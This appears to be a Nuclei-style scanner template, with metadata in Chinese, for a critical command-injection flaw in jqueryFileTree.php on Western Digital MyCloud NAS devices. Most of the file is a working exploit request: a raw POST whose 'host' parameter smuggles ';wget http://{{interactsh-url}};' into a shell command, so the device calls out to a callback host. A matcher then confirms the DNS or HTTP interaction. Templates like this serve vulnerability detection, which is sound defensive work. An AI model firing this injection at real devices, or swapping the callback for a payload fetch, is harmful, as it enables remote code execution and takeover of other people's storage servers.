id: wd-cloud-jqueryFileTree-rce
info:
  name: 西部数码 NAS jqueryFileTree.php 命令执行漏洞
  author: leadlife
  severity: critical
  description: Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS jqueryFileTree.php中存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。
  reference: 
    - https://www.yuque.com/lvguo-pibd8/fqbwsx/wt0opn2rf41p85n3
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: rce,wdcloud,oob

http:
  - raw:
      - |
        POST /web/addons/jqueryFileTree.php HTTP/1.1
        Host: xxx.com
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 40

        host=";wget http://{{interactsh-url}};"

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or